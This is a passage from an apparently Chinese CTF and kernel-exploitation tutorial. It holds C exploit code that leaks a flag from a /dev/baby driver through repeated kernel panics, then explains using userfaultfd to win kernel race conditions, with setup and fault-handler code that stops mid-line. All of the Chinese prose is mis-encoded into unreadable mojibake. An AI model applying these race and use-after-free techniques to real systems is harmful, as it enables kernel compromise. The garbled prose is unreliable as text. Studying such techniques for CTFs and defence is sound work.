class="hljs-meta-string">&lt;sys/mman.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;sys/types.h&gt;</span></span><br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> </span><br><span class="hljs-class">&#123;</span><br> <span class="hljs-keyword">char</span> * flag_addr;<br> <span class="hljs-keyword">int</span> flag_len;<br>   &#125;flag = &#123; .flag_len = <span class="hljs-number">33</span>&#125;;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span> ** argv, <span class="hljs-keyword">char</span> ** envp)</span></span><br><span class="hljs-function"></span>&#123;<br> <span class="hljs-keyword">int</span> fd, flag_len;<br> <span class="hljs-keyword">char</span> * buf, *flag_addr;<br><br>    <span class="hljs-keyword">if</span> (argc &lt; <span class="hljs-number">2</span>)<br> &#123;<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;usage: ./exp flag&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>    &#125;<br>    flag_len = <span class="hljs-built_in">strlen</span>(argv[<span class="hljs-number">1</span>]);<br><br>    fd = open(<span class="hljs-string">&quot;/dev/baby&quot;</span>, O_RDWR);<br> buf = (<span class="hljs-keyword">char</span>*) mmap(<span class="hljs-literal">NULL</span>, <span class="hljs-number">0x1000</span>, PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_SHARED, <span class="hljs-number">-1</span>, <span class="hljs-number">0</span>);<br>    flag_addr = buf + <span class="hljs-number">0x1000</span> - flag_len;<br>    <span class="hljs-built_in">memcpy</span>(flag_addr, argv[<span class="hljs-number">1</span>], flag_len);<br>    flag.flag_addr = flag_addr;<br>    ioctl(fd, <span class="hljs-number">0x1337</span>, &amp;flag);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>æ¯”å¦‚è¯´è¿™é‡Œçš„æµ‹è¯• flag æ˜¯ <code>flag&#123;THIS_IS_A_FLAG_1234&#125;</code>ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºï¼Œæˆ‘ä»¬æˆåŠŸé€šè¿‡ kernel panic å¾—çŸ¥ flag çš„ç¬¬ä¸€ä¸ªå­—ç¬¦ä¸º <code>T</code></p><p><a href="https://i.loli.net/2021/09/08/F1IRZwUh2ix7SGL.png"><img src="https://s2.loli.net/2023/02/06/YGug3blstjnLATk.png" alt="img"></a></p><p>å½“ç„¶ï¼Œè‹¥æ˜¯èƒ½å¤Ÿä¼˜åŒ–æˆçº¯æ±‡ç¼–ä»£ç ï¼Œå¯æ‰§è¡Œæ–‡ä»¶çš„ä½“ç§¯å°†èƒ½å¤Ÿå†ç¼©å°ä¸€ä¸ªæ¡£æ¬¡ï¼Œå¤§å¤§é™ä½çˆ†ç ´æ¬¡æ•°ï¼Œç¬”è€…æ¯”è¾ƒæ‡’ï¼Œè¿™é‡Œä¾¿ä¸å†ç»™å‡ºä¼˜åŒ–åçš„æ±‡ç¼–ä»£ç </p><blockquote><p>å½“ç„¶ï¼Œä¸åˆ°ä¸‡ä¸å¾—å·²åŸºæœ¬ä¸Šä¸ä¼šç”¨è¿™ç§ç´¯æ­»äººçš„æ–¹æ³•</p></blockquote></blockquote><h2 id="userfaultfdï¼ˆmay-obsoleteï¼‰"><a href="#userfaultfdï¼ˆmay-obsoleteï¼‰" class="headerlink" title="userfaultfdï¼ˆmay obsoleteï¼‰"></a><em>userfaultfdï¼ˆmay obsoleteï¼‰</em></h2><h3 id="userfaultfd-ä¸æ¡ä»¶ç«äº‰"><a href="#userfaultfd-ä¸æ¡ä»¶ç«äº‰" class="headerlink" title="userfaultfd ä¸æ¡ä»¶ç«äº‰"></a>userfaultfd ä¸æ¡ä»¶ç«äº‰</h3><p>ä¸¥æ ¼æ„ä¹‰è€Œè¨€ userfaultfd å¹¶éæ˜¯ä¸€ç§åˆ©ç”¨æ‰‹æ³•ï¼Œ<strong>è€Œæ˜¯ Linux çš„ä¸€ä¸ªç³»ç»Ÿè°ƒç”¨</strong>ï¼Œç®€å•æ¥è¯´ï¼Œé€šè¿‡ userfaultfd è¿™ç§æœºåˆ¶ï¼Œ<strong>ç”¨æˆ·å¯ä»¥é€šè¿‡è‡ªå®šä¹‰çš„ page fault handler åœ¨ç”¨æˆ·æ€å¤„ç†ç¼ºé¡µå¼‚å¸¸</strong></p><p>ä¸‹é¢çš„è¿™å¼ å›¾å¾ˆå¥½åœ°ä½“ç°äº† userfaultfd çš„æ•´ä¸ªæµç¨‹ï¼š</p><p><a href="https://i.loli.net/2021/09/08/i4C7oOvHdG2RqUm.png"><img src="https://s2.loli.net/2023/02/06/79S6DiYJaT4yV8p.png" alt="image.png"></a></p><p>è¦ä½¿ç”¨ userfaultfd ç³»ç»Ÿè°ƒç”¨ï¼Œæˆ‘ä»¬é¦–å…ˆè¦æ³¨å†Œä¸€ä¸ª userfaultfdï¼Œé€šè¿‡ ioctl ç›‘è§†ä¸€å—å†…å­˜åŒºåŸŸï¼ŒåŒæ—¶è¿˜éœ€è¦ä¸“é—¨å¯åŠ¨ä¸€ä¸ªç”¨ä»¥è¿›è¡Œè½®è¯¢çš„çº¿ç¨‹ <code>uffd monitor</code>ï¼Œè¯¥çº¿ç¨‹ä¼šé€šè¿‡ <code>poll()</code> å‡½æ•°ä¸æ–­è½®è¯¢<strong>ç›´åˆ°å‡ºç°ç¼ºé¡µå¼‚å¸¸</strong></p><ul><li>å½“æœ‰ä¸€ä¸ªçº¿ç¨‹åœ¨è¿™å—å†…å­˜åŒºåŸŸå†…è§¦å‘ç¼ºé¡µå¼‚å¸¸æ—¶ï¼ˆæ¯”å¦‚è¯´ç¬¬ä¸€æ¬¡è®¿é—®ä¸€ä¸ªåŒ¿åé¡µï¼‰ï¼Œè¯¥çº¿ç¨‹ï¼ˆç§°ä¹‹ä¸º faulting çº¿ç¨‹ï¼‰è¿›å…¥åˆ°å†…æ ¸ä¸­å¤„ç†ç¼ºé¡µå¼‚å¸¸</li><li>å†…æ ¸ä¼šè°ƒç”¨ <code>handle_userfault()</code> äº¤ç”± userfaultfd å¤„ç†</li><li>éšå faulting çº¿ç¨‹è¿›å…¥å µå¡çŠ¶æ€ï¼ŒåŒæ—¶å°†ä¸€ä¸ª <code>uffd_msg</code> å‘é€ç»™ monitor çº¿ç¨‹ï¼Œç­‰å¾…å…¶å¤„ç†ç»“æŸ</li><li>monitor çº¿ç¨‹è°ƒç”¨é€šè¿‡ ioctl å¤„ç†ç¼ºé¡µå¼‚å¸¸ï¼Œæœ‰å¦‚ä¸‹é€‰é¡¹ï¼š<ul><li><code>UFFDIO_COPY</code>ï¼šå°†ç”¨æˆ·è‡ªå®šä¹‰æ•°æ®æ‹·è´åˆ° faulting page ä¸Š</li><li><code>UFFDIO_ZEROPAGE</code> ï¼šå°† faulting page ç½®0</li><li><code>UFFDIO_WAKE</code>ï¼šç”¨äºé…åˆä¸Šé¢ä¸¤é¡¹ä¸­ <code>UFFDIO_COPY_MODE_DONTWAKE</code> å’Œ <code>UFFDIO_ZEROPAGE_MODE_DONTWAKE</code> æ¨¡å¼å®ç°æ‰¹é‡å¡«å……</li></ul></li><li>åœ¨å¤„ç†ç»“æŸå monitor çº¿ç¨‹å‘é€ä¿¡å·å”¤é†’ faulting çº¿ç¨‹ç»§ç»­å·¥ä½œ</li></ul><p>ä»¥ä¸Šä¾¿æ˜¯ userfaultfd è¿™ä¸ªæœºåˆ¶çš„æ•´ä¸ªæµç¨‹ï¼Œè¯¥æœºåˆ¶æœ€åˆè¢«è®¾è®¡æ¥ç”¨ä»¥è¿›è¡Œè™šæ‹Ÿæœº/è¿›ç¨‹çš„è¿ç§»ç­‰ç”¨é€”ï¼Œä½†æ˜¯<strong>é€šè¿‡è¿™ä¸ªæœºåˆ¶æˆ‘ä»¬å¯ä»¥æ§åˆ¶è¿›ç¨‹æ‰§è¡Œæµç¨‹çš„å…ˆåé¡ºåºï¼Œä»è€Œä½¿å¾—å¯¹æ¡ä»¶ç«äº‰çš„åˆ©ç”¨æˆåŠŸç‡å¤§å¹…æé«˜</strong></p><p>è€ƒè™‘åœ¨å†…æ ¸æ¨¡å—å½“ä¸­æœ‰ä¸€ä¸ªèœå•å †çš„æƒ…å†µï¼Œå…¶ä¸­çš„æ“ä½œéƒ½æ²¡æœ‰åŠ é”ï¼Œé‚£ä¹ˆä¾¿å­˜åœ¨æ¡ä»¶ç«äº‰çš„å¯èƒ½ï¼Œè€ƒè™‘å¦‚ä¸‹ç«äº‰æƒ…å†µï¼š</p><ul><li>çº¿ç¨‹1ä¸æ–­åœ°åˆ†é…ä¸ç¼–è¾‘å †å—</li><li>çº¿ç¨‹2ä¸æ–­åœ°é‡Šæ”¾å †å—</li></ul><p>æ­¤æ—¶çº¿ç¨‹1ä¾¿<strong>æœ‰å¯èƒ½ç¼–è¾‘åˆ°è¢«é‡Šæ”¾çš„å †å—</strong>ï¼Œè‹¥æ˜¯æ­¤æ—¶æ°å¥½æˆ‘ä»¬åˆå°†è¿™ä¸ªå †å—ç”³è¯·åˆ°äº†åˆé€‚çš„ä½ç½®ï¼ˆæ¯”å¦‚è¯´ tty_operationsï¼‰ï¼Œé‚£ä¹ˆæˆ‘ä»¬ä¾¿å¯ä»¥å®Œæˆå¯¹è¯¥å †å—çš„é‡å†™ï¼Œä»è€Œè¿›è¡Œä¸‹ä¸€æ­¥åˆ©ç”¨</p><p>ä½†æ˜¯æ¯«æ— ç–‘é—®çš„æ˜¯ï¼Œè‹¥æ˜¯ç›´æ¥å¼€ä¸¤ä¸ªçº¿ç¨‹è¿›è¡Œç«äº‰ï¼Œå‘½ä¸­çš„å‡ ç‡æ˜¯æ¯”è¾ƒä½çš„ï¼Œæˆ‘ä»¬ä¹Ÿå¾ˆéš¾åˆ¤æ–­æ˜¯å¦å‘½ä¸­</p><p>ä½†å‡å¦‚çº¿ç¨‹1ä½¿ç”¨è¯¸å¦‚ <code>copy_from_user</code> ã€<code>copy_to_user</code> ç­‰æ–¹æ³•åœ¨ç”¨æˆ·ç©ºé—´ä¸å†…æ ¸ç©ºé—´ä¹‹é—´æ‹·è´æ•°æ®ï¼Œé‚£ä¹ˆæˆ‘ä»¬ä¾¿å¯ä»¥ï¼š</p><ul><li>å…ˆç”¨ mmap åˆ†ä¸€å—åŒ¿åå†…å­˜ï¼Œä¸ºå…¶æ³¨å†Œ userfaultfdï¼Œç”±äºæˆ‘ä»¬æ˜¯ä½¿ç”¨ mmap åˆ†é…çš„åŒ¿åå†…å­˜ï¼Œæ­¤æ—¶è¯¥å—å†…å­˜å¹¶æ²¡æœ‰å®é™…åˆ†é…ç‰©ç†å†…å­˜é¡µ</li><li>çº¿ç¨‹1åœ¨å†…æ ¸ä¸­åœ¨è¿™å—å†…å­˜ä¸å†…æ ¸å¯¹è±¡é—´è¿›è¡Œæ•°æ®æ‹·è´ï¼Œ<strong>åœ¨è®¿é—®æ³¨å†Œäº† userfaultfd å†…å­˜æ—¶ä¾¿ä¼šè§¦å‘ç¼ºé¡µå¼‚å¸¸ï¼Œé™·å…¥é˜»å¡ï¼Œæ§åˆ¶æƒè½¬äº¤ userfaultfd çš„ uffd monitor çº¿ç¨‹</strong></li><li><strong>åœ¨ uffd monitor çº¿ç¨‹ä¸­æˆ‘ä»¬ä¾¿èƒ½å¯¹çº¿ç¨‹1æ­£åœ¨æ“ä½œçš„å†…æ ¸å¯¹è±¡è¿›è¡Œæ¶æ„æ“ä½œ</strong>ï¼ˆä¾‹å¦‚è¦†å†™çº¿ç¨‹1æ­£åœ¨è¯»å†™çš„å†…æ ¸å¯¹è±¡ï¼Œæˆ–æ˜¯å°†çº¿ç¨‹1æ­£åœ¨è¯»å†™çš„å†…æ ¸å¯¹è±¡é‡Šæ”¾æ‰åå†åˆ†é…åˆ°æˆ‘ä»¬æƒ³è¦çš„åœ°æ–¹ï¼‰</li><li>æ­¤æ—¶å†è®©çº¿ç¨‹1ç»§ç»­æ‰§è¡Œï¼Œçº¿ç¨‹ 1 ä¾¿ä¼š<strong>å‘æˆ‘ä»¬æƒ³è¦å†™å…¥çš„ç›®æ ‡å†™å…¥ç‰¹å®šæ•°æ®/ä»æˆ‘ä»¬æƒ³è¦è¯»å–çš„ç›®æ ‡è¯»å–ç‰¹å®šæ•°æ®</strong>äº†</li></ul><p>ç”±æ­¤ï¼Œæˆ‘ä»¬ä¾¿æˆåŠŸåˆ©ç”¨ userfaultfd å®Œæˆäº†å¯¹æ¡ä»¶ç«äº‰æ¼æ´çš„åˆ©ç”¨ï¼Œè¿™é¡¹æŠ€æœ¯çš„å­˜åœ¨ä½¿å¾—æ¡ä»¶ç«äº‰çš„å‘½ä¸­ç‡å¤§å¹…æé«˜</p><h3 id="userfaultfd-çš„å…·ä½“ç”¨æ³•"><a href="#userfaultfd-çš„å…·ä½“ç”¨æ³•" class="headerlink" title="userfaultfd çš„å…·ä½“ç”¨æ³•"></a>userfaultfd çš„å…·ä½“ç”¨æ³•</h3><blockquote><p>ä»¥ä¸‹ä»£ç å‚è€ƒè‡ª Linux man pageï¼Œç•¥æœ‰æ”¹åŠ¨</p></blockquote><p>é¦–å…ˆå®šä¹‰æ¥ä¸‹æ¥éœ€è¦ç”¨åˆ°çš„ä¸€äº›æ•°æ®ç»“æ„</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs C"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/types.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;linux/userfaultfd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;pthread.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;errno.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;signal.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;poll.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/mman.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/syscall.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/ioctl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;poll.h&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">errExit</span><span class="hljs-params">(<span class="hljs-keyword">char</span> * msg)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">puts</span>(msg);<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>&#125;<br><span class="hljs-comment">//...</span><br><br><span class="hljs-keyword">long</span> uffd;          <span class="hljs-comment">/* userfaultfd file descriptor */</span><br><span class="hljs-keyword">char</span> *addr;         <span class="hljs-comment">/* Start of region handled by userfaultfd */</span><br><span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> len;  <span class="hljs-comment">/* Length of region handled by userfaultfd */</span><br><span class="hljs-keyword">pthread_t</span> thr;      <span class="hljs-comment">/* ID of thread that handles page faults */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">uffdio_api</span> <span class="hljs-title">uffdio_api</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">uffdio_register</span> <span class="hljs-title">uffdio_register</span>;</span><br></code></pre></div></td></tr></table></figure><p>é¦–å…ˆé€šè¿‡ userfaultfd ç³»ç»Ÿè°ƒç”¨æ³¨å†Œä¸€ä¸ª userfaultfdï¼Œå…¶ä¸­ <code>O_CLOEXEC</code> å’Œ <code>O_NONBLOCK</code> å’Œ open çš„ flags ç›¸åŒï¼Œç¬”è€…ä¸ªäººè®¤ä¸ºè¿™é‡Œå¯ä»¥ç†è§£ä¸ºæˆ‘ä»¬åˆ›å»ºäº†ä¸€ä¸ªè™šæ‹Ÿè®¾å¤‡ <code>userfault</code></p><p>è¿™é‡Œç”¨ mmap åˆ†ä¸€ä¸ªåŒ¿åé¡µç”¨ä½œåç»­è¢«ç›‘è§†çš„åŒºåŸŸ</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs C"><span class="hljs-comment">/* Create and enable userfaultfd object */</span><br>uffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);<br><span class="hljs-keyword">if</span> (uffd == <span class="hljs-number">-1</span>)<br>    errExit(<span class="hljs-string">&quot;userfaultfd&quot;</span>);<br><br>uffdio_api.api = UFFD_API;<br>uffdio_api.features = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">if</span> (ioctl(uffd, UFFDIO_API, &amp;uffdio_api) == <span class="hljs-number">-1</span>)<br>    errExit(<span class="hljs-string">&quot;ioctl-UFFDIO_API&quot;</span>);<br><br><span class="hljs-comment">/* Create a private anonymous mapping. The memory will be</span><br><span class="hljs-comment">    demand-zero paged--that is, not yet allocated. When we</span><br><span class="hljs-comment">    actually touch the memory, it will be allocated via</span><br><span class="hljs-comment">    the userfaultfd. */</span><br>len = <span class="hljs-number">0x1000</span>;<br>addr = (<span class="hljs-keyword">char</span>*) mmap(<span class="hljs-literal">NULL</span>, len, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span class="hljs-number">-1</span>, <span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span> (addr == MAP_FAILED)<br>    errExit(<span class="hljs-string">&quot;mmap&quot;</span>);<br></code></pre></div></td></tr></table></figure><p>ä¸ºè¿™å—å†…å­˜åŒºåŸŸæ³¨å†Œ userfaultfd</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs C"><span class="hljs-comment">/* Register the memory range of the mapping we just created for</span><br><span class="hljs-comment">    handling by the userfaultfd object. In mode, we request to track</span><br><span class="hljs-comment">    missing pages (i.e., pages that have not yet been faulted in). */</span><br><br>uffdio_register.range.start = (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>) addr;<br>uffdio_register.range.len = len;<br>uffdio_register.mode = UFFDIO_REGISTER_MODE_MISSING;<br><span class="hljs-keyword">if</span> (ioctl(uffd, UFFDIO_REGISTER, &amp;uffdio_register) == <span class="hljs-number">-1</span>)<br>    errExit(<span class="hljs-string">&quot;ioctl-UFFDIO_REGISTER&quot;</span>);<br></code></pre></div></td></tr></table></figure><p>å¯åŠ¨ monitor è½®è¯¢çº¿ç¨‹ï¼Œæ•´ä¸ª userfaultfd çš„å¯åŠ¨æµç¨‹å°±ç»“æŸäº†ï¼Œæ¥ä¸‹æ¥ä¾¿æ˜¯ç­‰å¾…ç¼ºé¡µå¼‚å¸¸çš„è¿‡ç¨‹</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs C"><span class="hljs-comment">/* Create a thread that will process the userfaultfd events */</span><br><span class="hljs-keyword">int</span> s = pthread_create(&amp;thr, <span class="hljs-literal">NULL</span>, fault_handler_thread, (<span class="hljs-keyword">void</span> *) uffd);<br><span class="hljs-keyword">if</span> (s != <span class="hljs-number">0</span>) &#123;<br>    errExit(<span class="hljs-string">&quot;pthread_create&quot;</span>);<br>&#125;<br></code></pre></div></td></tr></table></figure><p>monitor è½®è¯¢çº¿ç¨‹åº”å½“å®šä¹‰å¦‚ä¸‹å½¢å¼ï¼Œè¿™é‡Œç»™å‡ºçš„æ˜¯ UFFD_COPYï¼Œå³å°†è‡ªå®šä¹‰æ•°æ®æ‹·è´åˆ° faulting page ä¸Šï¼š</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs C"><span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span> page_size;<br><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> *</span><br><span class="hljs-function"><span class="hljs-title">fault_handler_thread</span><span class="hljs-params">(<span class="hljs-keyword">void</span> *arg)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">static</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">uffd_msg</span> <span class="hljs-title">msg</span>;</span>   <span class="hljs-comment">/* Data read from userfaultfd */</span><br>    <span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span> fault_cnt = <span class="hljs-number">0</span>;     <span class="hljs-comment">/* Number of faults so far handled */</span><br>    <span class="hljs-keyword">long</span> uffd;                    <span class="hljs-comment">/* userfaultfd file descriptor */</span><br>    <span class="hljs-keyword">static</span> <span class="hljs-keyword">char</span> *page = <span class="hljs-literal">NULL</span>;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">uffdio_copy</span> <span class="hljs-title">uffdio_copy</span>;</span><br>    <span class="hljs-keyword">ssize_t</span> nread;<br><br>    page_size = sysconf(_SC_PAGE_SIZE);<br><br>    uffd = (<span class="hljs-keyword">long</span>) arg;<br><br>    <span class="hljs-comment">/* Create a page that will be copied into the faulting region */</span><br><br>    <span class="hljs-keyword">if</span> (page == <span class="hljs-literal">NULL</span>) <br>    &#123;<br>        page = mmap(<span class="hljs-literal">NULL</span>, page_size, PROT_READ | PROT_WRITE,<br>                    MAP_PRIVATE | MAP_ANONYMOUS, <span class="hljs-number">-1</span>, <span class="hljs-number">0</span>);<br>        <span class="hljs-keyword">if</span> (page == MAP_FAILED)<br>            errExit(<span class="hljs-string">&quot;mmap&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-comment">/* Loop, handling incoming events on the userfaultfd</span><br><span class="hljs-comment">        file descriptor */</span><br><br>    <span class="hljs-keyword">for</span> (;;) <br>    &#123;<br>        <span class="hljs-comment">/* See what poll() tells us about the userfaultfd */</span><br><br>        <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pollfd</span> <span class="hljs-title">pollfd</span>;</span><br>        <span class="hljs-keyword">int</span> nready;<br>        pollfd.fd = uffd;<br>        pollfd.events = POLLIN;<br>        nready = poll(&amp;pollfd, <span class="hljs-number">1</span>, <span class="hljs-number">-1</span>);<br>        <span class="hljs-keyword">if</span> (nready == <span class="hljs-number">-1</span>)<br>            errExit(<span class="hljs-string">&quot;poll&quot;</span>);<br><br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\nfault_handler_thread():\n&quot;</span>);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;    poll() returns: nready = %d; &quot;</span><br>                <span class="hljs-string">&quot;POLLIN = %d; POLLERR = %d\n&quot;</span>, nready,<br>                (pollfd.revents &amp; POLLIN) != <span class="hljs-number">0</span>,<br>                (pollfd.revents &amp; POLLERR) != <span class="hljs-number">0</span>);<br><br>        <span class="hljs-comment">/* Read an event from the userfaultfd */</span><br><br>        nread = read(uffd, &amp;msg, <span class="hljs-keyword">sizeof</span>(msg));<br>        <span class="hljs-keyword">if</span> (nread == <span class="hljs-number">0</span>)<br>        &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;EOF on userfaultfd!\n&quot;</span>);<br>            <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>        &#125;<br><br>        <span class="hljs-keyword">if</span> (nread == <span class="hljs-number">-1</span>)<br>            errExit(<span class="hljs-string">&quot;read&quot;</span>);<br><br>        <span class="hljs-comment">/* We expect only one kind of event; verify that assumption */</span><br><br>        <span class="hljs-keyword">if</span> (msg.event != UFFD_EVENT_PAGEFAULT)<br>        &#123;<br>            <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;Unexpected event on userfaultfd\n&quot;</span>);<br>            <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>        &#125;<br>        <span class="hljs-comment">/* Display info about the page-fault event */</span><br><br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;    UFFD_EVENT_PAGEFAULT event: &quot;</span>);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;flags = %llx; &quot;</span>, msg.arg.pagefault.flags);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;address = %llx\n&quot;</span>, msg.arg.pagefault.address);<br><br>        <span class="hljs-comment">/* Copy the page pointed to by &#x27;page&#x27; into the faulting</span><br><span class="hljs-comment">            region. Vary the contents that are copied in, so that it</span><br><span class="hljs-comment">            is more obvious that each fault is handled separately. */</span><br><br>        <span class="hljs-built_in">memset</span>(page, <span class="hljs-string">&#x27;A&#x27;</span> + fault_cnt % <span class="hljs-number">20</span>, page_size);<br>        fault_cnt++;<br><br>        uffdio_copy.src = (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>) page;<br><br>        <span class="hljs-comment">/* We need to handle page faults in units of pages(!).</span><br><span class="hljs-comment">        So, round faulting address down to page boundary */</span><br><br>        uffdio_copy.dst = (<span 